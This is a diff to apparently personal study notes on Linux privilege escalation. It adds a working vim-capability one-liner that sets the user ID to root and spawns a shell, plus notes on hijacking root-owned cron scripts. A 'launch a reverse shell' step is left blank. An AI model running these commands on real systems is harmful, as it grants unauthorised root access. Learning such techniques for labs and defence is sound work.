@@ -144,5 +144,18 @@ Capabilities
 -capabilites help manage privileges at a more granular level
 'getcap -r /' generates a lot of erros so it is good practice to redirect error messages to /dev/null
 'getcap -r / 2>/dev/null'
+vim:
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+Cron Jobs
+-used to run scripts or binaries at specific times
+-run with privilege of the owner and not current user
+-task that runs on root privileges, change script that will be run to new script with root privileges
+-stored as crontabs
+-any user can read the file keeping system-wide cron jobs under '/etc/crontab'
+backup.sh - configured to run every minute
+-launch a reverse shell:
+1. 
+
 
 
